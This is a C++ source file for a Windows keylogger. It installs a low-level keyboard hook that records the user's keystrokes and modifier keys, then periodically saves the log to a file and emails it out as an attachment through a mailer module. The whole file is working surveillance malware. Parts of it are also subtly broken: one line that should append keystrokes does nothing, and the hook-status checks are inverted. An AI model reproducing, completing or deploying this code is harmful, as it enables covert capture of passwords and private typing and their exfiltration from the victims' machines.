#include <iostream>
#include <fstream>
#include <Windows.h>
#include "Constants.h"
#include "Mailer.h"

using namespace std;

string LogKeys = "";

void MailTimer()
{
	if (LogKeys.empty())
		return;

	string LatestFile = Input_Output::StrokeLogger(LogKeys);
	
	if (LatestFile.empty())
	{
		KeyLogger::ErrorLogger("KeyLogger File Creation failed");
		return;
	}

	KeyLogger::InfoLogger("Attempting to send mail");

	int mailing = Mailer::SendMail("Log [" + LatestFile + "]", "Key Log files have been attached.\n", Input_Output::GetPath(true) + LatestFile);

	if (mailing != 7)
		KeyLogger::ErrorLogger("Mail sending has failed with error : " + KeyLogger::ToString(mailing));
	else
		LogKeys = "";
}

Timer SetMailTimer(MailTimer, 500 * 60, Timer::Infinite);

HHOOK Hook = NULL;

LRESULT KeyBoardHooker(int code, WPARAM wp, LPARAM lp)
{
	if (code < 0)
		CallNextHookEx(Hook, code, wp, lp);

	KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lp; 

	if (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN) // To Check if a key pressed and is being held. eg : (Shift)* + SomeKey
	{
		LogKeys + Map_Keys::Keys[kb->vkCode].Name;
		if (kb->vkCode == VK_RETURN)
			LogKeys += '\n';
	}
	else if (wp == WM_KEYUP || wp == WM_SYSKEYUP)
	{
		DWORD key = kb->vkCode;
		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT ||
			key == VK_MENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN)
		{
			string keyname = Map_Keys::Keys[kb->vkCode].Name;
			keyname.insert(1, "/");
			LogKeys += keyname;
		}
	}
	return CallNextHookEx(Hook, code, wp, lp);
}

bool InstallKeyHook()
{
	KeyLogger::InfoLogger("Key Hooking started. Timer beginning now.");
	SetMailTimer.Timer_Start(true);
	Hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyBoardHooker, GetModuleHandle(NULL), 0);
	return (bool)(Hook == NULL);
}

bool UninstaKeyHook()
{
	bool ret = UnhookWindowsHookEx(Hook);
	Hook = NULL;
	return (bool)ret;
}

bool IsKeyHooked()
{
	return bool(Hook == NULL);
}